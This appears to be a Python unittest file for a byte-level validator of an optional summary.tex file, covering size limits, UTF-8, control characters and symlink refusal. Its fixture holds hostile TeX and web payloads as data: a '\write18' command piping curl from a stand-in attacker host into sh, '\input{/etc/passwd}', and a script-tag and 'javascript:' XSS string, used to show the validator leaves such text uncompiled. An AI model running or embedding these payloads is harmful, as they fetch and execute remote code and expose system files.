"""The rules of the optional summary.tex (evaluation/summary_tex.py): python3 -m unittest discover -s evaluation -p 'test_summary_tex.py'.

Every rule has a case that breaks it and a case that sits on its edge; hostile-but-valid text (TeX that would run a shell command if anyone compiled it) passes untouched,
because the rules are about bytes, and nothing here compiles, includes or runs the text."""
import os
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import summary_tex as st  # noqa: E402

HOSTILE = ("\\documentclass{article}\n\\immediate\\write18{curl http://evil.example | sh}\n\\input{/etc/passwd}\n\\openout3=/tmp/x\n"
           "@everyone @octocat <script>alert(1)</script> ![x](http://e/x.png) [a](javascript:alert(1)) ```\n" + "x" * 50000 + "\r\n\ttab, CRLF and unicode: \u00e9 \u2211 \U0001d54f\n").encode()


class Rules(unittest.TestCase):
    def test_the_limit_is_100_kib_and_the_edge_is_inclusive(self):
        self.assertEqual(st.MAX_BYTES, 102400)
        self.assertIsNone(st.problem(b"a" * st.MAX_BYTES))
        self.assertIn("102,401 bytes", st.problem(b"a" * (st.MAX_BYTES + 1)))
        self.assertIn("limit is 102,400", st.problem(b"a" * (st.MAX_BYTES + 1)))

    def test_empty_or_blank_is_refused(self):
        for data in (b"", b"  \n\t\r\n"):
            self.assertIn("is empty", st.problem(data))

    def test_it_must_be_utf8(self):
        self.assertIsNone(st.problem("caf\u00e9 \u2211\n".encode()))
        self.assertIn("must be UTF-8", st.problem(b"bad \xff byte\n"))
        self.assertIn("must be UTF-8", st.problem("x".encode() + b"\xed\xa0\x80"), "an encoded surrogate is not UTF-8")
        self.assertIn("must be UTF-8", st.problem(b"\xc0\xaf"), "an overlong form is not UTF-8")
        self.assertIn("must be UTF-8", st.problem("caf\u00e9".encode("latin-1")))

    def test_only_tab_lf_cr_may_be_control_characters(self):
        self.assertIsNone(st.problem(b"a\tb\r\nc\n"))
        self.assertIn("U+0000", st.problem(b"a\x00b"))
        for code in [*range(0, 9), 11, 12, *range(14, 32), 127, 0x85, 0x9f]:
            text = f"ab{chr(code)}cd\n".encode()
            self.assertIn(f"U+{code:04X}", st.problem(text) or "", hex(code))
        self.assertIn("character 3", st.problem(b"ab\x1bcd"))

    def test_hostile_but_valid_text_passes(self):
        self.assertIsNone(st.problem(HOSTILE), "TeX is data here: whatever it would do if compiled is not this module's business")


class Files(unittest.TestCase):
    def setUp(self):
        self.t = tempfile.TemporaryDirectory()
        self.dir = Path(self.t.name)

    def tearDown(self):
        self.t.cleanup()

    def test_absent_is_fine(self):
        self.assertEqual(st.inspect_file(self.dir / "summary.tex"), (None, None))

    def test_a_regular_file_is_read_as_bytes_without_newline_translation(self):
        (self.dir / "summary.tex").write_bytes(HOSTILE)
        data, why = st.inspect_file(self.dir / "summary.tex")
        self.assertIsNone(why)
        self.assertEqual(data, HOSTILE)
        self.assertIn(b"\r\n", data)

    def test_a_symlink_is_refused_even_when_it_points_at_a_good_file(self):
        (self.dir / "real.tex").write_text("fine\n")
        os.symlink(self.dir / "real.tex", self.dir / "summary.tex")
        self.assertEqual(st.inspect_file(self.dir / "summary.tex"), (None, "summary.tex must be a regular file, not a symbolic link."))
        os.symlink("/etc/passwd", self.dir / "link2.tex")
        self.assertIn("symbolic link", st.inspect_file(self.dir / "link2.tex")[1])
        os.symlink(self.dir / "nowhere", self.dir / "dangling.tex")
        self.assertIn("symbolic link", st.inspect_file(self.dir / "dangling.tex")[1])

    def test_a_directory_and_other_non_files_are_refused(self):
        (self.dir / "summary.tex").mkdir()
        self.assertEqual(st.inspect_file(self.dir / "summary.tex"), (None, "summary.tex must be a regular file, not a directory."))
        if hasattr(os, "mkfifo"):
            os.mkfifo(self.dir / "fifo.tex")
            self.assertIn("regular file", st.inspect_file(self.dir / "fifo.tex")[1])

    def test_oversize_is_refused_before_reading_and_a_bad_file_names_its_rule(self):
        (self.dir / "big.tex").write_bytes(b"a" * (st.MAX_BYTES + 1))
        self.assertIn("limit is 102,400", st.inspect_file(self.dir / "big.tex")[1])
        (self.dir / "nul.tex").write_bytes(b"a\x00b")
        self.assertIn("U+0000", st.inspect_file(self.dir / "nul.tex")[1])
        (self.dir / "latin.tex").write_bytes(b"caf\xe9\n")
        self.assertIn("UTF-8", st.inspect_file(self.dir / "latin.tex")[1])


if __name__ == "__main__":
    unittest.main()
